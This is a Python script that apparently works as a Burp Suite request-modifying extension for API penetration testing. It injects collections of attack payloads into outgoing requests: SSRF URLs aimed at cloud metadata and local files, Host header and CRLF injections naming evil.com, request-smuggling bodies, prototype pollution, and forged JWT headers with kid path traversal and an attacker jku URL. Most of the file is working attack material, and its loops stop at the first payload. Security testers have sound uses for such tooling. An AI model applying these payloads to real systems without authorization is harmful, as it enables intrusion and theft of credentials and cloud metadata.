#!/usr/bin/env python3
"""
Comprehensive API Security Testing Bambda
Includes SSRF, HTTP methods, Host header injection, parameter pollution, request smuggling, CORS, prototype pollution, and JWT kid/JKU tests
"""

import json
import base64
import hashlib
import hmac
import time
import random
import string
import os
import sys
from urllib.parse import urlparse, parse_qs, urlencode

# Add src to path for applicability utility
CURRENT_DIR = os.path.dirname(__file__)
SRC_PATH = os.path.abspath(os.path.join(CURRENT_DIR, "..", "..", "src"))
if SRC_PATH not in sys.path:
    sys.path.append(SRC_PATH)

try:
    from utils.intelligence_checker import ApplicabilityChecker
except Exception:  # Fallback: lightweight inline checker
    class ApplicabilityChecker:  # noqa: D401
        def __init__(self):
            self.api_hints = ("/api/", "/rest/", "/v1/", "/v2/", "/v3/", "/graphql", "/gql")
        def _path(self, req):
            return getattr(req, "path", "").lower()
        def _headers(self, req):
            return {str(k).lower(): str(v) for k, v in (getattr(req, "headers", {}) or {}).items()}
        def _params(self, req):
            return getattr(req, "parameters", {}) or {}
        def is_cors_applicable(self, req):
            return any(h in self._path(req) for h in self.api_hints)
        def is_json_mutation_applicable(self, req):
            ct = (self._headers(req).get("content-type", "")).lower(); m = getattr(req, "method", "GET").upper()
            return "json" in ct and m in ("POST","PUT","PATCH")
        def is_jwt_header_applicable(self, req):
            return self._headers(req).get("authorization", "").lower().startswith("bearer ")
        def is_ssrf_applicable(self, req):
            keys = {k.lower() for k in self._params(req).keys()}; hints = ("url","uri","link","redirect","target","callback","path")
            return any(x in " ".join(keys) for x in hints)
        def is_insecure_methods_applicable(self, req):
            return any(h in self._path(req) for h in self.api_hints)
        def is_host_header_injection_applicable(self, req):
            return "host" in self._headers(req)
        def is_parameter_pollution_applicable(self, req):
            return len(self._params(req)) > 0 and any(h in self._path(req) for h in self.api_hints)
        def is_request_smuggling_applicable(self, req):
            return self._path(req).find("/api/") >= 0 and getattr(req, "method", "GET").upper() in ("POST", "PUT", "PATCH")

class ComprehensiveAPISecurityTester:
    """Comprehensive API security testing class with all attack vectors"""
    
    def __init__(self):
        self.applicability = ApplicabilityChecker()
        # Initialize all payload collections
        self.ssrf_payloads = [
            # Internal network access
            "http://127.0.0.1", "http://localhost", "http://0.0.0.0", "http://[::1]",
            "http://10.0.0.1", "http://192.168.1.1", "http://172.16.0.1",
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/", # AWS
            "http://metadata.google.internal/computeMetadata/v1/", # GCP
            "http://metadata.azure.internal/metadata/instance", # Azure
            # Internal services
            "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:5432",
            "http://127.0.0.1:6379", "http://127.0.0.1:27017",
            # Protocol handlers
            "file:///etc/passwd", "file:///etc/hosts", "dict://127.0.0.1:11211/",
            # Bypass techniques
            "http://127.1", "http://2130706433", "http://0x7f000001"
        ]
        
        self.insecure_methods = ["PUT", "DELETE", "TRACE", "OPTIONS", "PATCH"]
        
        self.host_injection_payloads = [
            "evil.com", "attacker.com", "malicious.com", "localhost", "127.0.0.1",
            "evil.com:80", "evil.com:443", "http://evil.com", "https://evil.com",
            "evil.com:80@attacker.com", "evil.com#attacker.com", "evil.com%00.attacker.com",
            "2130706433", "0x7f000001", "017700000001", "127.1"
        ]
        
        self.parameter_pollution_payloads = [
            "id=1&id=2", "user=admin&user=test", "search=test&search=admin",
            "id[]=1&id[]=2", "user[]=admin&user[]=test",
            "id=1&id=&id=2", "user=admin&user=null&user=test"
        ]
        
        self.request_smuggling_payloads = [
            # CL.TE
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
            # TE.CL
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX",
            # TE.TE
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nX",
            # CL.CL
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX"
        ]

    def lambda_handler_ssrf(self, request):
        """Test for SSRF vulnerabilities"""
        if not self.applicability.is_ssrf_applicable(request):
            return request
        
        params = request.parameters.copy()
        for param_name, _ in params.items():
            if param_name.lower() in ["url", "link", "redirect", "target", "callback", "uri", "path"]:
                for payload in self.ssrf_payloads:
                    params[param_name] = payload
                    request.parameters = params
                    return request
        
        if getattr(request, "method", "GET").upper() == "POST":
            try:
                body = json.loads(request.body)
                for key in body:
                    if isinstance(body[key], str) and key.lower() in ["url", "link", "redirect", "target"]:
                        for payload in self.ssrf_payloads:
                            body[key] = payload
                            request.body = json.dumps(body)
                            return request
            except (json.JSONDecodeError, AttributeError):
                pass
        
        return request

    def lambda_handler_insecure_methods(self, request):
        """Test for insecure HTTP methods"""
        if not self.applicability.is_insecure_methods_applicable(request):
            return request
        for method in self.insecure_methods:
            request.method = method
            return request
        return request

    def lambda_handler_host_injection(self, request):
        """Test for Host header injection"""
        if not self.applicability.is_host_header_injection_applicable(request):
            return request
        headers = request.headers.copy()
        for payload in self.host_injection_payloads:
            headers["Host"] = payload
            headers["X-Forwarded-Host"] = payload
            request.headers = headers
            return request
        return request

    def lambda_handler_parameter_pollution(self, request):
        """Test for HTTP parameter pollution"""
        if not self.applicability.is_parameter_pollution_applicable(request):
            return request
        params = request.parameters.copy()
        for payload in self.parameter_pollution_payloads:
            pairs = payload.split('&')
            for pair in pairs:
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    if key not in params:
                        params[key] = []
                    if isinstance(params[key], list):
                        params[key].append(value)
                    else:
                        params[key] = [params[key], value]
            request.parameters = params
            return request
        return request

    def lambda_handler_request_smuggling(self, request):
        """Test for HTTP request smuggling"""
        if not self.applicability.is_request_smuggling_applicable(request):
            return request
        for payload in self.request_smuggling_payloads:
            headers = request.headers.copy()
            headers["Content-Length"] = "6"
            headers["Transfer-Encoding"] = "chunked"
            request.headers = headers
            request.body = payload
            return request
        return request

    def lambda_handler_cors_probe(self, request):
        if not self.applicability.is_cors_applicable(request):
            return request
        headers = request.headers.copy()
        headers["Origin"] = "https://evil.example.com"
        headers["Access-Control-Request-Method"] = "POST"
        headers["Access-Control-Request-Headers"] = "Authorization, Content-Type"
        request.headers = headers
        request.method = "OPTIONS"
        return request

    def lambda_handler_json_prototype_pollution(self, request):
        if not self.applicability.is_json_mutation_applicable(request):
            return request
        try:
            body = json.loads(request.body or '{}')
        except Exception:
            body = {}
        # Inject prototype payload (first variant)
        body.update({"__proto__": {"polluted": "yes"}})
        request.body = json.dumps(body)
        return request

    def _jwt_b64url(self, data_dict):
        raw = json.dumps(data_dict, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    def lambda_handler_jwt_kid_jku_tests(self, request):
        if not self.applicability.is_jwt_header_applicable(request):
            return request
        headers = request.headers.copy()
        auth = headers.get("Authorization") or headers.get("authorization")
        if not auth or not auth.lower().startswith("bearer "):
            return request
        token = auth.split(" ", 1)[1].strip()
        parts = token.split('.')
        if len(parts) < 2:
            return request
        try:
            header_json = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        except Exception:
            header_json = {}
        # Inject kid path traversal and JKU URL
        header_json["kid"] = "../../../../etc/passwd"
        header_json["jku"] = "http://evil.example.com/jwks.json"
        header_b64 = self._jwt_b64url(header_json)
        # Keep original payload part, set dummy signature
        new_token = header_b64 + "." + parts[1] + ".signature"
        headers["Authorization"] = "Bearer " + new_token
        request.headers = headers
        return request

    def lambda_handler_comprehensive_testing(self, request):
        """Comprehensive testing combining all attack vectors"""
        request = self.lambda_handler_ssrf(request)
        request = self.lambda_handler_insecure_methods(request)
        request = self.lambda_handler_host_injection(request)
        request = self.lambda_handler_parameter_pollution(request)
        request = self.lambda_handler_request_smuggling(request)
        # New probes
        request = self.lambda_handler_cors_probe(request)
        request = self.lambda_handler_json_prototype_pollution(request)
        request = self.lambda_handler_jwt_kid_jku_tests(request)
        return request

    def lambda_handler_advanced_ssrf(self, request):
        """Advanced SSRF testing with bypass techniques"""
        if not self.applicability.is_ssrf_applicable(request):
            return request
        advanced_ssrf_payloads = [
            "http://attacker.com", "http://evil.com",
            "file:///etc/passwd", "file:///proc/version", "file:///proc/cmdline",
            "dict://127.0.0.1:11211/", "ftp://127.0.0.1/", "gopher://127.0.0.1/_",
            "http://127.0.0.1:80@evil.com", "http://evil.com#127.0.0.1",
            "http://127.0.0.1%00.evil.com", "http://127.0.0.1%09.evil.com",
            "http://127.0.0.1%0a.evil.com", "http://evil.com\u0000.127.0.0.1"
        ]
        params = request.parameters.copy()
        for param_name in params:
            if param_name.lower() in ["url", "link", "redirect", "target", "callback"]:
                for payload in advanced_ssrf_payloads:
                    params[param_name] = payload
                    request.parameters = params
                    return request
        return request

    def lambda_handler_advanced_host_injection(self, request):
        """Advanced Host header injection testing"""
        if not self.applicability.is_host_header_injection_applicable(request):
            return request
        advanced_host_payloads = [
            "evil.com\r\nHost: attacker.com", "evil.com%0d%0aHost: attacker.com",
            "evil.com\0.attacker.com", "evil.com%00.attacker.com",
            "evil.com\u0000.attacker.com", "evil.com\u0009.attacker.com",
            "2130706433", "0x7f000001", "017700000001", "127.1",
            "169.254.169.254", "metadata.google.internal", "metadata.azure.internal"
        ]
        headers = request.headers.copy()
        for payload in advanced_host_payloads:
            headers["Host"] = payload
            headers["X-Forwarded-Host"] = payload
            request.headers = headers
            return request
        return request

    def lambda_handler_advanced_parameter_pollution(self, request):
        """Advanced parameter pollution testing"""
        if not self.applicability.is_parameter_pollution_applicable(request):
            return request
        advanced_pollution_payloads = [
            "id=1&id=2&id=3", "user=admin&user=test&user=guest",
            "id=1&id[]=2", "user=admin&user[]=test",
            "id=1&id=&id=2", "user=admin&user=null&user=test",
            "id[]=1&id[]=2&id[]=3", "user[]=admin&user[]=test&user[]=guest"
        ]
        params = request.parameters.copy()
        for payload in advanced_pollution_payloads:
            pairs = payload.split('&')
            for pair in pairs:
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    if key not in params:
                        params[key] = []
                    if isinstance(params[key], list):
                        params[key].append(value)
                    else:
                        params[key] = [params[key], value]
            request.parameters = params
            return request
        return request

    def lambda_handler_advanced_request_smuggling(self, request):
        """Advanced request smuggling testing"""
        if not self.applicability.is_request_smuggling_applicable(request):
            return request
        advanced_smuggling_payloads = [
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: -1\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: invalid\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX-Forwarded-For: 127.0.0.1",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX-Real-IP: 127.0.0.1"
        ]
        for payload in advanced_smuggling_payloads:
            headers = request.headers.copy()
            headers["Content-Length"] = "6"
            headers["Transfer-Encoding"] = "chunked"
            request.headers = headers
            request.body = payload
            return request
        return request

# Main handler function
def main(request):
    """
    Main handler that applies all comprehensive API security testing modifications
    """
    tester = ComprehensiveAPISecurityTester()
    request = tester.lambda_handler_comprehensive_testing(request)
    request = tester.lambda_handler_advanced_ssrf(request)
    request = tester.lambda_handler_advanced_host_injection(request)
    request = tester.lambda_handler_advanced_parameter_pollution(request)
    request = tester.lambda_handler_advanced_request_smuggling(request)
    return request

if __name__ == "__main__":
    print("Comprehensive API Security Testing Bambda with Applicability Intelligence")
    print("Skips non-applicable checks based on request context") 